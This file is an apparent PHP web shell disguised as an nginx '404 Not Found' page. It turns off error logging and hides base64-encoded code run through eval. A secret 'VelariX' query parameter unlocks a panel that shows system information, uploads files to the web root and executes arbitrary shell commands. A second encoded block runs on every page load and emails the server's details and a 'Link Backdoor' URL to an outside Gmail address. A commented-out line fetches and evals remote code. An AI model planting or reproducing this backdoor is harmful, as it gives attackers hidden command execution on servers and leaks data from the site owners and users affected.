<html>
<head><title>404 Not Found</title>
<link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=https://127.0.0.1:22/"/>
</head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.16.0</center>
<?php
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);

//* @eval(base64_decode(file_get_contents('http://raw.githubusercontent.com/anoaghost/anoaghost.github.io/master/files/php/blocker.txt')));

if(isset($_GET['VelariX']))
{
	eval(base64_decode("ZnVuY3Rpb24gc2hvd3N0YXQoJHN0YXQpIHtpZiAoJHN0YXQ9PSJvbiIpIHtyZXR1cm4gIjxmb250IHN0eWxlPSdjb2xvcjpncmVlbic+T048L2ZvbnQ+Ijt9DQplbHNlIHtyZXR1cm4gIjxmb250IHN0eWxlPSdjb2xvcjpyZWQnPk9GRjwvZm9udD4iO319DQpmdW5jdGlvbiB0ZXN0a29udG9sKCkge2lmIChleGVjKCdwZXJsIC1oJykpIHtyZXR1cm4gc2hvd3N0YXQoIm9uIik7fWVsc2Uge3JldHVybiBzaG93c3RhdCgib2ZmIik7fX0NCmZ1bmN0aW9uIHRlc3RtZW1laygpIHtpZiAoZXhlYygnd2dldCAtLWhlbHAnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdG1la2koKSB7aWYgKGV4ZWMoJ3B5dGhvbiAtLWhlbHAnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdG15c3FsKCkge2lmIChmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdGN1cmwoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnY3VybF92ZXJzaW9uJykpIHtyZXR1cm4gc2hvd3N0YXQoIm9uIik7fWVsc2Uge3JldHVybiBzaG93c3RhdCgib2ZmIik7fX0NCmZ1bmN0aW9uIHRlc3RvcmFjbGUoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnb2NpbG9nb24nKSkge3JldHVybiBzaG93c3RhdCgib24iKTsgfWVsc2UgeyByZXR1cm4gc2hvd3N0YXQoIm9mZiIpO319DQpmdW5jdGlvbiB0ZXN0bXNzcWwoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnbXNzcWxfY29ubmVjdCcpKSB7cmV0dXJuIHNob3dzdGF0KCJvbiIpO31lbHNlIHsgcmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gZGlzYWJsZWZ1bmMoKSB7aWYgKCRkaXNhYmxlZnVuYz1AaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSl7IHJldHVybiAiPHNwYW4gc3R5bGU9J2NvbG9yOic+PGZvbnQgY29sb3I9J3JlZCc+Ii4kZGlzYWJsZWZ1bmMuIjwvZm9udD48L3NwYW4+IjsgfWVsc2UgeyByZXR1cm4gIjxzcGFuIHN0eWxlPSdjb2xvcjpncmVlbic+Tm90aGluZyBCaXRjaCE8L3NwYW4+IjsgfX0="));
	echo "<table width='100%' height='40%'><td align='center'>";
	echo "<br>###############################################<br>";
	echo "System : <b>".php_uname()."</b><br>";
	echo "Server : <a href='#' target='_blank'>".htmlspecialchars($_SERVER['HTTP_HOST'])."</a> | IP Server : ".htmlspecialchars($_SERVER['REMOTE_ADDR'])."</br>";
	echo "MySQL : ".testmysql()." | Oracle : ".testoracle()." | MsSQL : ".testmssql()." | curl : ".testcurl()." | wget : ".testmemek()." | Perl : ".testkontol()." | Python : ".testmeki();
	echo "<br>Disabled Functions: ".disablefunc()."<br>";
	echo "###############################################<br>";
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='file' name='files'>
	<input type='submit' name='upload' value='upload'>
	</form>
	";
	
	$root = $_SERVER['DOCUMENT_ROOT'];
	$files = $_FILES['files']['name'];
	$dest = $root.'/'.$files;
	if(isset($_POST['upload'])) {
		if(is_writable($root)) {
			if(@copy($_FILES['files']['tmp_name'], $dest)) {
				$web = "http://".$_SERVER['HTTP_HOST']."/";
				echo "Success Upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
				} else {
					echo "Fail Upload to Directory Root.";
					}
					} else {
						if(@copy($_FILES['files']['tmp_name'], $files)) {
							echo "Success Upload <b>$files</b> in this folder.";
							} else {
								echo "FAIL";
								}
								}
								}
	echo '<hr width="70%"><form method="POST" action=""><input type="text" name="cmd" placeholder="Execute Commands"><input type="submit" value=">>"></form>';
	$cmd = $_POST['cmd']; $exec = shell_exec("$cmd"); echo "<textarea rows='15' cols='70'>$exec</textarea></td></table>";
}
eval(base64_decode("JHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCiRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCiRib2R5ID0gIg0KVmFsZWlyaXlhIFxuDQpVbmFtZTogIi5waHBfdW5hbWUoKS4iXG4NCkxpbmsgQmFja2Rvb3I6IDxhIGhyZWY9Jy8vIi4kd2ViJGluaiInIHRhcmdldD0nX2JsYW5rJyBzdHlsZT0nY29sb3I6cmVkOyc+Ii4kd2ViJGluaiI8L2E+XG4iLiJcbg0KRS1zZXJ2ZXI6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkuIlxuDQpFLXNlcnZlcjI6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiU0VSVkVSX05BTUUiXSkuIlxuXG4NCklQOiANCiI7DQptYWlsKCJhc29sb25nZW50b2RAZ21haWwuY29tIiwiS09NQU5EQU4gISBQRU5HVU5KVU5HIEhBUkkgSU5JID4gJHdlYiRpbmoiLCAiJGJvZHkiKTs="));
?>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
